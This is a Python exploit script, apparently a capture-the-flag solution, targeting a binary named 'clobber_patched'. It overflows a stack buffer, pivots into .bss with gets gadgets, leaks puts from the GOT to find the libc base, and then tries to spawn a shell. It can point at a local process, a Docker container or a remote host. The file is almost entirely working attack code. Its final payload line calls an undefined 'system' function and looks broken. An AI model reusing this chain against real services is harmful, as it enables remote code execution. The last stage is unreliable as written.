#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./clobber_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

# b *0x4011E0
b *0x4011E1

c
'''

p = start()

# ==================== EXPLOIT ====================

def exploit():

    offset = 0x20
    bss = 0x404400
    gets_gadget = 0x4011BE
    puts_gadget = 0x4011CF
    leave_ret = 0x4011E0
    # stdout = 0x404040

    payload1 = flat({

        offset: [

            bss - 0x10,         # saved rbp 1
            gets_gadget         # saved rip 1
        ]

    }, filler=b'A')

    input("Pivot payload")
    sl(payload1)

    # 0x404400
    payload2 = flat({

        offset: [

            exe.got.setvbuf + 0x20,     # saved rbp 2
            gets_gadget,                # saved rip 2

            exe.got.puts + 0x20,
            puts_gadget,

            cyclic(0x10),

            bss + 0x30 + 0x20,
            gets_gadget,

        ]
        
    }, filler=b'B')

    input("Payload 2")
    sl(payload2)

    payload3 = b'C' * 0x10
    payload3 += p64(bss + 0x20) + p64(leave_ret) 
    payload3 += p64(bss) + p32(leave_ret)

    input("Payload 3")
    sl(payload3)

    rls(3)

    puts = fixleak(rl()[:-1])
    libc.address = puts - libc.sym.puts
    info('puts @ %#x', puts)
    success('libc base @ %#x', libc.address)

    input("Drop shell")
    payload4 = system(offset + 0x8)
    sl(payload4)

    interactive()

if __name__ == '__main__':
    exploit()
